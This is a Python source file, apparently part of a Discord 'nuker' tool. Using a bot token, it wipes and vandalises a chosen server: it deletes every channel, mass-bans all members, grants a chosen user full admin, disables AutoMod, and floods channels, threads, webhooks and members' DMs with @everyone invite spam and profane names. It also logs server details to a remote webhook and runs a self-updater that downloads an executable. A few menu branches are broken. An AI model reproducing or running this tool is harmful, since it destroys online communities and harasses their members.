        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Error disabling AutoMod: {e}"))

# ------------------------------
# Grant Admin Role
# ------------------------------
async def grant_admin(guild):
    try:
        user_id = int(input(f"{Fore.YELLOW}[>] Enter User ID to grant admin: "))
        member = await guild.fetch_member(user_id)
        admin_role = await guild.create_role(name="Gab Loves You!", permissions=discord.Permissions.all())
        await member.add_roles(admin_role)
        print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Granted admin role to {member.display_name}"))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [✔] Admin role granted successfully."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to grant admin role: {e}"))

# ------------------------------
# Create Roles
# ------------------------------
async def create_roles(guild):
    async def create():
        try:
            await guild.create_role(name="FUCKED BY KEISHO GRAH")
            print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Created Role"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to create role: {e}"))

    await asyncio.gather(*(create() for _ in range(50)))
    print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [✔] Created 50 roles."))
    clear_screen()

# Function to spam threads in each text channel
async def thread_spammer(guild):
    message_content = "# @everyone @here https://discord.gg/keisho JOIN UP SON"

    async def create_thread_in_channel(channel):
        try:
            if isinstance(channel, discord.TextChannel):
                # Send a base message to start the thread from
                base_msg = await channel.send(message_content)
                # Create the thread
                await channel.create_thread(
                    name="@here https://discord.gg/keisho join up son",
                    message=base_msg,
                    auto_archive_duration=60
                )
                print(f"{Fore.GREEN}[+] Created thread in #{channel.name}")
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to create thread in #{channel.name}: {e}")

    await asyncio.gather(*(create_thread_in_channel(c) for c in guild.text_channels))
    clear_screen()
    
# ------------------------------
# Pause Server Invites
# ------------------------------
async def pause_server_invites(guild):
    for channel in guild.channels:
        try:
            overwrite = channel.overwrites_for(guild.default_role)
            if overwrite.create_instant_invite is not False:
                overwrite.create_instant_invite = False
                await channel.set_permissions(guild.default_role, overwrite=overwrite)
                print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Disabled invites in #{channel.name}"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to update #{channel.name}: {e}"))

# ------------------------------
# Spam New Soundboard Sounds
# ------------------------------
async def spam_new_sounds(guild):
    try:
        amount = int(input("[>] How many soundboard sounds to spam? (max 50 recommended): "))
        mp3_url = input("[>] Enter direct link to .mp3 file: ")

        if not mp3_url.endswith(".mp3"):
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Invalid file. Must be .mp3 URL"))
            return

        print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [~] Downloading MP3..."))

        async with aiohttp.ClientSession() as session:
            async with session.get(mp3_url) as resp:
                if resp.status != 200:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to download the MP3 file"))
                    return
                mp3_data = await resp.read()

        async def upload_sound(index):
            try:
                file = discord.File(io.BytesIO(mp3_data), filename=f"sound{index}.mp3")
                await guild.create_guild_sound(name=f"sound{index}", file=file)
                print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Uploaded sound {index}"))
            except Exception as e:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to upload sound {index}: {e}"))

        await asyncio.gather(*(upload_sound(i) for i in range(min(amount, 50))))
        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [✔] Finished uploading up to {min(amount, 50)} soundboard sounds."))

    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Unexpected error: {e}"))

# ------------------------------
# Delete All Channels
# ------------------------------
async def delete_all_channels(guild):
    async def del_channel(channel):
        try:
            await channel.delete()
            print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [<] Deleted #{channel.name}"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to delete #{channel.name}: {e}"))

    await asyncio.gather(*(del_channel(c) for c in guild.channels))
    clear_screen()

# ------------------------------
# Voice Channel Spammer
# ------------------------------
async def vc_spammer(guild):
    async def create_vc():
        try:
            await guild.create_voice_channel("https://discord.gg/keisho")
            print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Created VC channel"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to create VC: {e}"))

    await asyncio.gather(*(create_vc() for _ in range(100)))
    clear_screen()

# ------------------------------
# Disable Community Settings
# ------------------------------
async def disable_community(guild):
    try:
        await guild.edit(
            community=False,
            rules_channel=None,
            public_updates_channel=None
        )
        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [✔] Disabled community settings"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to disable community settings: {e}"))
        clear_screen()

# ------------------------------
# Super Spam (50 messages & thread per channel)
# ------------------------------
async def super_spam(guild):
    async def spam_in_channel(channel):
        if not isinstance(channel, discord.TextChannel):
            return
        try:
            for _ in range(50):
                msg = await channel.send("# @everyone https://discord.gg/keisho")
                await channel.create_thread(
                    name="# @everyone https://discord.gg/keisho | https://gabpogi2025/doxxir join up son",
                    message=msg,
                    auto_archive_duration=60
                )
                await asyncio.sleep(0.5)
                print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [+] Message & thread in #{channel.name}"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed in #{channel.name}: {e}"))

    await asyncio.gather(*(spam_in_channel(c) for c in guild.text_channels))
    clear_screen()

# Function to quickly nuke guild with rate-aware task batching
async def fast_nuke(guild, channel_count=50, message_count=30):
    await guild.edit(name="Fucked by gab ughhghghg")
    print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [~] Renamed server to Blazed By KeishoK"))

    semaphore = asyncio.Semaphore(10)

    async def del_chan_safe(channel):
        async with semaphore:
            try:
                await channel.delete()
                print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [<] Deleted {channel.name}"))
            except discord.Forbidden:
                print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [!] No perms to delete {channel.name}"))
            except Exception as e:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Error deleting {channel.name}: {e}"))

    async def create_chan_and_spam():
        async with semaphore:
            try:
                channel = await guild.create_text_channel(
                    'bobo ka tol',
                    topic='Keisho WrldWide | https://discord.gg/keisho | https://keisholovesyou | https://gabporn4k.com'
                )
                webhook = await channel.create_webhook(name="gg/KeishoK")
                for _ in range(message_count):
                    await webhook.send("# @everyone https://discord.gg/Keisho")
                print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} [*] Channel {channel.name} created and spammed"))
            except Exception as e:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Failed to create/spam: {e}"))

    # Delete channels
    await asyncio.gather(*[del_chan_safe(c) for c in guild.channels])

    # Create and spam channels
    await asyncio.gather(*[create_chan_and_spam() for _ in range(channel_count)])

    clear_screen()

async def spam_messages(guild, bot=None):
    AVATAR_URL = "https://media.discordapp.net/attachments/1012542184853094430/1012544174450561134/unknown.png?ex=6835c77f&is=683475ff&hm=2bf39efd07bab809f4006ce75d3d8f61c96b8bc097c0e801fdde469aa3f60395&format=webp&quality=lossless&"

    def get_choice():
        # Replace with async input or command args if needed
        return input("Choose spam method (webhook/bot): ").strip().lower()

    choice = get_choice()

    async def send_with_rate_limit_handling(send_func, *args, **kwargs):
        delay = 1
        max_retries = 5
        for attempt in range(max_retries):
            try:
                await send_func(*args, **kwargs)
                return True
            except RateLimited as e:
                wait_time = e.retry_after if hasattr(e, "retry_after") else delay
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Rate limited! Waiting {wait_time:.2f}s before retrying..."))
                await asyncio.sleep(wait_time)
                delay *= 2
            except (HTTPException, Forbidden) as e:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Send failed due to {e}. Skipping..."))
                return False
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Max retries hit, skipping message."))
        return False

    async def _fetch_avatar_bytes(url):
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Failed to fetch avatar image, status {resp.status}"))
                    return None
                return await resp.read()

    async def spam_message_per_channel(guild):
        avatar_bytes = await _fetch_avatar_bytes(AVATAR_URL)

        async def spam_in_channel(channel):
            if not isinstance(channel, discord.TextChannel):
                return
            try:
                webhooks = await channel.webhooks()
                webhook = None
                for wh in webhooks:
                    if wh.name == ".gg/Keisho runs you all":
                        webhook = wh
                        break
                if webhook is None:
                    webhook = await channel.create_webhook(
                        name=".gg/Keisho runs you all",
                        avatar=avatar_bytes
                    )
                    print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [LOGS] Created webhook in #{channel.name}"))

                for i in range(30):
                    success = await send_with_rate_limit_handling(
                        webhook.send,
                        "# @everyone https://discord.gg/keisho",
                        username=".gg/Keisho runs you all"
                    )
                    if success:
                        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [LOGS] Sent message {i+1}/30 in #{channel.name} (webhook)"))
                    else:
                        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Failed sending message {i+1} in #{channel.name} (webhook)"))
                        break
                    await asyncio.sleep(0.4)
            except Exception as e:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Failed to send messages in #{channel.name}: {e}"))

        await asyncio.gather(*(spam_in_channel(c) for c in guild.text_channels if isinstance(c, discord.TextChannel)))

    async def spam_message_per_bot(guild):
        async def spam_in_channel(channel):
            if not isinstance(channel, discord.TextChannel):
                return
            try:
                for i in range(30):
                    success = await send_with_rate_limit_handling(channel.send, "# @everyone https://discord.gg/keisho")
                    if success:
                        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [LOGS] Sent message {i+1}/30 in #{channel.name} (bot)"))
                    else:
                        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Failed sending message {i+1} in #{channel.name} (bot)"))
                        break
                    await asyncio.sleep(0.4)
            except Exception as e:
                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Failed to send messages in #{channel.name} (bot): {e}"))

        await asyncio.gather(*(spam_in_channel(c) for c in guild.text_channels if isinstance(c, discord.TextChannel)))

    if choice in ["w", "webhook", "wb"]:
        await spam_message_per_channel(guild)
    elif choice in ["b", "bot"]:
        await spam_message_per_bot(guild)
    else:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Invalid choice! Please enter 'webhook' or 'bot'."))


async def spam_channel(channel):
    webhook = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(avatar_url) as resp:
                if resp.status == 200:
                    avatar_bytes = await resp.read()
                    webhook = await channel.create_webhook(
                        name=".gg/keisho on top baby",
                        avatar=avatar_bytes
                    )
                else:
                    webhook = await channel.create_webhook(
                        name=".gg/keisho on top baby"
                    )
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} Webhook creation failed: {e}"))
        webhook = None

    while True:
        try:
            await channel.send("# @everyone https://discord.gg/keisho")
            await channel.send("# @everyone https://discord.gg/keisho https://discord.gg/keisho ")
            if webhook:
                await webhook.send("# @everyone https://discord.gg/keisho https://discord.gg/keisho https://discord.gg/keisho")
        except:
            pass
        await asyncio.sleep(0.3)


# Function to mass ban all members with a reason
async def mass_ban(guild):
    members = [m for m in guild.members if not m.bot]
    reason = "https://discord.gg/keisho"

    async def ban(member):
        try:
            await guild.ban(member, reason=reason)
            print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [>] Banned {member} - Reason: {reason}"))
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to ban {member}: {e}"))

    await asyncio.gather(*(ban(m) for m in members))
    clear_screen()


async def role_channel_webhook_spam(guild):
    try:
        amount = int(input("How many Channels and Roles: "))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Invalid number entered."))
        return

    for i in range(amount):
        try:
            channel = await guild.create_text_channel(
                random.choice(channel_names),
                topic="Keisho WrldWide | https://discord.gg/keisho | https://keisholovesyou | https://gabporn4k.com"
            )
            print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} Successfully made channel"))

            await guild.create_role(
                name=random.choice(role_names),
                colour=discord.Colour(random.randint(0, 0xFFFFFF))
            )
            print(Colorate.Horizontal(Colors.rainbow, f"{get_time()} Successfully made role [{i}]!"))

            asyncio.create_task(spam_channel(channel))

        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} Unable to create or spam channel! {e}"))


async def change_server_icon(guild: discord.Guild):
    await send_webhook_log(WEBHOOK_URL, guild, "Nuke Information | Before")
    
    # URLs
    gif_icon_url = "https://cdn.discordapp.com/icons/1358442501790236757/a_e2c6979c38c1ca6f01fe1d265ca0eb1b.gif?size=4096"
    png_icon_url = "https://cdn.discordapp.com/attachments/1373448117684273172/1375254144704577658/red-small-letter-k-ZR17Yw6-600-removebg-preview.png"

    # Detect if GIF icons are allowed
    gif_allowed = guild.premium_tier >= 2  # Level 2 or higher

    icon_url = gif_icon_url if gif_allowed else png_icon_url
    icon_type = "GIF" if gif_allowed else "PNG"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
                    await guild.edit(icon=icon_bytes)
                    print(Colorate.Horizontal(Colors.green_to_cyan, f"[Keisho] {get_time()} [LOGS] Server icon ({icon_type}) set successfully!"))
                else:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[Keisho] {get_time()} [LOGS] Failed to fetch {icon_type} icon. HTTP Status: {resp.status}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} ❌ Error setting {icon_type} server icon: {e}"))


async def dm_member_with_retry(member: discord.Member, message: str, retry_delay=5, max_retries=3):
    for attempt in range(1, max_retries + 1):
        try:
            await member.send(message)
            return True
        except Forbidden:
            return False
        except HTTPException as e:
            if e.status == 429:
                print(f"Rate limited on {member}. Retrying in {retry_delay}s (Attempt {attempt})")
                await asyncio.sleep(retry_delay)
            else:
                print(f"Failed to message {member}: {e} (Attempt {attempt})")
                await asyncio.sleep(retry_delay)
    return False

async def dm_guild_members(guild: discord.Guild, message: str, concurrency: int = 10, delay_between: float = 0.11):
    semaphore = asyncio.Semaphore(concurrency)

    async def dm_with_semaphore(member: discord.Member):
        async with semaphore:
            success = await dm_member_with_retry(member, message)
            await asyncio.sleep(delay_between)
            return member, success

    members = [m for m in guild.members if not m.bot]
    print(Colorate.Horizontal(Colors.green_to_cyan, f"[Keisho] {get_time()} [LOGS] Sending DMs to {len(members)} members..."))

    results = await asyncio.gather(*[dm_with_semaphore(m) for m in members])

    sent = sum(1 for _, success in results if success)
    failed = len(members) - sent
    print(Colorate.Horizontal(Colors.red_to_blue, f"[Keisho] {get_time()} [LOGS] DM sending complete: {sent} sent, {failed} failed or blocked."))
    return results











def print_title(status_text):
    sys.stdout.write(f"\033]0;https://discord.gg/keisho | {status_text}\007")
    sys.stdout.flush()

async def animate_status(text="Authenticating"):
    for i in range(3):
        print_title(f"{text}{'.' * i}")
        await asyncio.sleep(0.5)

TOKEN_FILE = "token_restored.json"


REMOTE_VERSION_URL = "https://raw.githubusercontent.com/kshdmspammer/keisho/main/version.txt"
REMOTE_EXE_URL_TEMPLATE = "https://github.com/kshdmspammer/keisho/releases/download/{tag}/keishonuker.exe"

LOCAL_VERSION_FILE = "version.txt"
LOCAL_EXE = sys.executable  # path of running exe

MB_YESNO = 0x04
MB_ICONQUESTION = 0x20
IDYES = 6
def native_message_box(text, title):
    result = ctypes.windll.user32.MessageBoxW(0, text, title, MB_YESNO | MB_ICONQUESTION)
    return result == IDYES

def console_progress_bar(downloaded, total):
    percent = int(downloaded / total * 100)
    bars = int(percent / 4)
    sys.stdout.write(f"\rDownloading... [{'#' * bars}{'.' * (25 - bars)}] {percent}%")
    sys.stdout.flush()

def download_with_progress(url, filename):
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        total_length = int(r.headers.get('content-length', 0))
        downloaded = 0
        with open(filename, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    console_progress_bar(downloaded, total_length)
    print()

def check_update():
    try:
        if '--skip-update' in sys.argv:
            return False, None

        remote_version = requests.get(REMOTE_VERSION_URL).text.strip()

        if os.path.exists(LOCAL_VERSION_FILE):
            with open(LOCAL_VERSION_FILE, "r") as f:
                local_version = f.read().strip()
        else:
            local_version = "0.0.0"

        if remote_version != local_version:
            if native_message_box(f"A new version ({remote_version}) is available. Update now?", "Update Available"):
                return True, remote_version

        return False, None
    except Exception as e:
        print("Update check failed:", e)
        return False, None

def run_update(remote_version):
    url = REMOTE_EXE_URL_TEMPLATE.format(tag=remote_version)
    temp_update_file = "update_temp.exe"
    
    try:
        print("Downloading update...")
        download_with_progress(url, temp_update_file)
    except Exception as e:
        print(f"Download failed: {e}")
        return False

    exe_path = os.path.abspath(sys.executable)
    bat_path = "updater.bat"

    bat_script = f'''
@echo off
echo Waiting for application to exit...
:loop
tasklist /FI "IMAGENAME eq {os.path.basename(exe_path)}" | find /I "{os.path.basename(exe_path)}" >nul
if NOT errorlevel 1 (
    timeout /t 1 >nul
    goto loop
)
echo Replacing old executable...
move /Y "{temp_update_file}" "{exe_path}"
echo Restarting application...
start "" "{exe_path}" --skip-update
del "%~f0"
'''

    with open(bat_path, "w") as f:
        f.write(bat_script)

    print("Running updater and exiting...")
    subprocess.Popen(bat_path, shell=True)
    sys.exit()




async def run_bot():
    protected_guild_id = 1358442501790236757
    while True:
        clear_screen()
        print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(banner_str)))
        print("\n" * 2)
        print_title("Authentication")

        # Load or input token
        if os.path.exists(TOKEN_FILE):
            print(Colorate.Horizontal(Colors.purple_to_blue, "╭─ Select an Option:"))
            print(Colorate.Horizontal(Colors.purple_to_blue, "├─ 1. Load Previous Token"))
            print(Colorate.Horizontal(Colors.purple_to_blue, "├─ 2. New Bot Token"))
            choicess = input(Colorate.Horizontal(Colors.purple_to_blue, "╰─ Choice: ")).strip()

            if choicess == "1":
                try:
                    with open(TOKEN_FILE, "r") as f:
                        data = json.load(f)
                        state["bot_token"] = data.get("bot_token", "").strip()
                        if not state["bot_token"]:
                            print(Colorate.Horizontal(Colors.red_to_blue, "❌ No token found in file."))
                            continue
                except Exception as e:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"❌ Failed to read token file: {e}"))
                    continue
            elif choicess == "2":
                token_prompt = Colorate.Horizontal(Colors.purple_to_blue, "Bot Token: ")
                state["bot_token"] = input(token_prompt).strip()
                with open(TOKEN_FILE, "w") as f:
                    json.dump({"bot_token": state["bot_token"]}, f)
            else:
                print(Colorate.Horizontal(Colors.red_to_blue, "❌ Invalid choice. Try again."))
                await asyncio.sleep(1)
                continue
        else:
            token_prompt = Colorate.Horizontal(Colors.purple_to_blue, "Bot Token: ")
            state["bot_token"] = input(token_prompt).strip()
            with open(TOKEN_FILE, "w") as f:
                json.dump({"bot_token": state["bot_token"]}, f)

        # Ask for guild ID
        guild_prompt = Colorate.Horizontal(Colors.purple_to_blue, "╭─ Guild ID: ")
        guild_id_input = input(guild_prompt).strip()
        try:
            guild_id = int(guild_id_input)
            if guild_id == protected_guild_id:
                print(Colorate.Horizontal(Colors.red_to_blue, "├─ This Guild Id Cannot Be Used ( PROTECTED ! )"))
                await asyncio.sleep(2)
                continue
            state["guild_id"] = guild_id
        except ValueError:
            print(Colorate.Horizontal(Colors.red_to_blue, "├─ Guild Id Wrong. Try Again"))
            await asyncio.sleep(1)
            continue

        # Attempt to login with animation
        try:
            task = asyncio.create_task(client.login(state["bot_token"]))
            while not task.done():
                await animate_status("Authenticating")
            await task  # re-raise exceptions if any
            await client.connect()
            break
        except discord.LoginFailure:
            print(Colorate.Horizontal(Colors.red_to_blue, "├─ Invalid token. Try again."))
            await asyncio.sleep(1)
            continue
        except Exception as e:
            print(Colorate.Horizontal(Colors.red_to_blue, f"├─ Error: {e}"))
            await asyncio.sleep(1)
            continue


        
@client.event
async def on_ready():
    print_title("Authenticated!")
    guild = client.get_guild(state["guild_id"])
    
    if not guild:
        print(Colorate.Horizontal(Colors.red_to_blue, "❌ Guild not found. Ensure bot is in the server."))
        await client.close()
        return

    state["guild"] = guild
    print(f"Connected as {client.user} | Guild: {guild.name}")
    current_page = 0

    while True:
        print_title("Main Menu")
        print("\n" * 2)
        valid_choices = print_menu(current_page)
        print("\n" * 1)
        choice = await get_user_choice()  # Use an async function to handle user input
        
        if choice == '<' and current_page > 0:
            current_page -= 1
        elif choice == '>' and current_page < 2:
            current_page += 1
        elif choice == 'q':
            print("Exiting...")
            await client.close()
            break
        elif choice in valid_choices:
            if choice == '1':
                await nuke_guild(guild, "https://cdn.discordapp.com/attachments/1310569860492689428/1375256749052924105/4feae153276146feef0fcc27d43f4f16.png")
            elif choice == '2':
                await rename_member(guild)
            elif choice == '3':
                await grant_admin(guild)
            elif choice == '4':
                await create_roles(guild)
            elif choice == '5':
                await mass_create_channels(guild)
            elif choice == '6':
                await thread_spammer(guild)
            elif choice == '7':
                await super_spam(guild)
            elif choice == '8':
               await spam_messages(guild)
            elif choice == '9':
                await mass_ban(guild)
            elif choice == '10':
                await delete_all_channels(guild)
            elif choice == '11':
                await vc_spammer(guild)
            elif choice == '12':
                await disable_community(guild)
            elif choice == '13':
                await fast_nuke(guild)
            elif choice == '14':
                await role_channel_webhook_spam(guild)
            elif choice == '15':
                message = input("[Keisho] > ")  # synchronous input; this works if run in main thread console
                await dm_guild_members(guild, message)
            elif choice == '16':
                new_name = await get_new_server_name()
                server = guild
                try:
                    await server.edit(name=new_name)
                    print(Colorate.Horizontal(Colors.green_to_cyan, f"[+] Server name changed successfully to '{new_name}'."))
                except discord.Forbidden:
                    print(Colorate.Horizontal(Colors.red_to_blue, "[!] Permission denied: You do not have permission to change the server name."))
                except discord.HTTPException as e:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[!] An error occurred while changing server name: {e.text}"))
                except Exception as e:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[!] An unexpected error occurred: {e}"))
            elif choice == '17':
                spam_emojis_from_link_threaded
            elif choice == '18':
                    server = client.get_guild(int(guild))
                    if server is None:
                        print(Colorate.Horizontal(Colors.red_to_blue, "[!] Server not found."))
                        return

                    while True:
                        invites = await server.invites()
                        if not invites:
                            print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [+] All invites deleted."))
                            break
                        
                        for invite in invites:
                            try:
                                await invite.delete(reason="Deleting all invites")
                                print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [+] Successfully deleted invite: {invite.code}"))
                            except discord.Forbidden:
                                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Permission denied: You do not have permission to delete invites."))
                            except discord.HTTPException as e:
                                print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] An error occurred while deleting invite: {e}"))
            elif choice == '19':
                await disable_automod(guild)
            elif choice == '20':
                await change_server_icon(guild)
            elif choice == '21':
                await delete_all_soundboard_sounds(guild)
            elif choice == '22':
                await spam_invites_with_threads(guild)
            elif choice == '23':
                await spam_emojis_from_link_threaded(guild)
            elif choice == '24':
                await delete_all_server_emojis(guild)
            elif choice == '25':
                await spam_new_sounds(guild)
            elif choice == '26':
                await pause_server_invites(guild)
        else:
            print("Invalid choice.")
            await asyncio.sleep(0.60)

# Async function for getting user input without blocking the event loop
async def get_user_choice():
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        None,
        lambda: input(Colorate.Horizontal(Colors.red_to_yellow, "Choice : "))
    )

# Helper functions
async def get_new_server_name():
    loop = asyncio.get_event_loop()
    prompt = Colorate.Horizontal(Colors.red_to_yellow, "[?] Enter the new server name:\n #> ")
    return await loop.run_in_executor(None, lambda: input(prompt))

async def create_emojis_from_url(guild):
    loop = asyncio.get_event_loop()
    prompt = Colorate.Horizontal(Colors.red_to_yellow, "[?] Enter image URLs separated by commas:\n #> ")
    image_urls = await loop.run_in_executor(None, lambda: input(prompt))
    image_urls = [url.strip() for url in image_urls.split(',')]

    server = guild
    if server is None:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Server not found."))
        return

    try:
        async with aiohttp.ClientSession() as session:
            tasks = []
            for image_url in image_urls:
                async with session.get(image_url) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        emoji_name = image_url.split('/')[-1].split('.')[0]
                        for _ in range(50):
                            tasks.append(server.create_custom_emoji(name=emoji_name, image=image_data))
                        print(Colorate.Horizontal(Colors.green_to_cyan, f"{get_time()} [+] Emojis created successfully from: {image_url}"))
                    else:
                        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Failed to fetch image from: {image_url}. Status code: {resp.status}"))
            await asyncio.gather(*tasks)
    except discord.Forbidden:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] Permission denied: You do not have permission to create emojis."))
    except discord.HTTPException as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] An error occurred while creating emojis: {e}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_blue, f"{get_time()} [!] An unexpected error occurred: {e}"))

def main():
    update_needed, remote_version = check_update()
    if update_needed:
        run_update(remote_version)  # This function ends the process
        return  # prevent any continuation after calling updater
    else:
        print("No update available.")
        asyncio.run(run_bot())

if __name__ == "__main__":
    main()